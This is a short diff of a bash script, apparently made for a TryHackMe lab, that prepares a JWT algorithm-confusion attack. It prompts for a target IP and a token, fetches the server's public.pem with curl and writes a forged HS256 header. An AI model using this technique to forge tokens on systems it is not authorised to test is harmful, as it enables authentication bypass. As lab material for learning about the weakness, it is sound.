@@ -1,5 +1,4 @@
 #!/usr/bin/env bash
-ip="10.10.188.75"
 modifiedheader="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
 modifiedheaderfile="modifiedheader.txt"
 modifiedsecretfile="modifiedsecret.txt"
@@ -11,6 +10,12 @@ hexpemfile="hexpublic.pem"
 hexkeyfile="hexkey.txt"
 pythonfilename="jwtTryHackMe.py"
 
+echo "IP of deployed machine: "  
+read ip  
+echo "Paste JWT Token: "
+read originaltoken
+
+echo ${originaltoken} | cut -d "." -f 2 $2 > ${payloadfile}
 curl "http://${ip}/public.pem" -o ${pemfile}
 echo "${modifiedheader}" > ${modifiedheaderfile}
 echo "${payload}" > ${payloadfile}
